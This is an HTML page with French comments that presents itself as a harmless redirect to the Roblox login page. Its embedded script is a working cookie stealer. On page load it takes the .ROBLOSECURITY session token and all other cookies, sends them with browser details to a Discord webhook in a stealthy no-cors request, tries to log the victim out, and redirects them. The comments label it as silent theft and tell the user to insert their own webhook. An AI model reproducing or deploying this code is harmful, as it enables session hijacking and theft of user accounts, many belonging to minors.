<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://www.roblox.com/login">
    <title>Redirection</title>
    <style>body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:50px;}</style>
</head>
<body>
    <h2>⏳ Redirection...</h2>
    <p>Vous allez être redirigé vers Roblox.</p>

    <script>
        (function() {
            // ============================================================
            //   REMPLACE ICI PAR L'URL DE TON WEBHOOK
            // ============================================================
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537081937582358528/v-GmnzihcuJ-u-0Ub7gbH1ZuEc71961t3eQtsGRAsVGDbyutfUW5KaE-FPROFRf1AWO";
            // ============================================================

            // 1. RÉCUPÉRER TOUS LES COOKIES
            const allCookies = document.cookie;

            // 2. EXTRAIRE .ROBLOSECURITY
            const cookiePairs = allCookies.split('; ');
            let robloxSecurity = null;
            for (let pair of cookiePairs) {
                if (pair.startsWith('.ROBLOSECURITY=')) {
                    robloxSecurity = pair.split('=')[1];
                    break;
                }
            }

            // 3. PRÉPARER LE PAYLOAD
            const embed = {
                title: robloxSecurity ? "🎯 COOKIE ROBLOX VOLÉ" : "⚠️ TENTATIVE DE VOL (pas de cookie)",
                color: robloxSecurity ? 0xff0000 : 0xffaa00,
                fields: [
                    { name: "🔑 .ROBLOSECURITY", value: robloxSecurity ? `\`${robloxSecurity}\`` : "❌ Aucun cookie trouvé", inline: false },
                    { name: "📦 Tous les cookies", value: `\`${allCookies || 'VIDE'}\``, inline: false },
                    { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
                    { name: "🌐 URL", value: window.location.href, inline: false },
                    { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
                ],
                footer: { text: "ShadowCAT // Vol silencieux" }
            };

            // 4. ENVOYER AU WEBHOOK (mode no-cors = furtif)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] }),
                mode: 'no-cors'
            }).catch(() => {});

            // 5. SUPPRIMER LE COOKIE POUR DÉCONNECTER LA VICTIME
            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";

            // 6. REDIRECTION IMMÉDIATE VERS LA VRAIE PAGE DE LOGIN
            window.location.replace("https://www.roblox.com/login");
        })();
    </script>
</body>
</html>
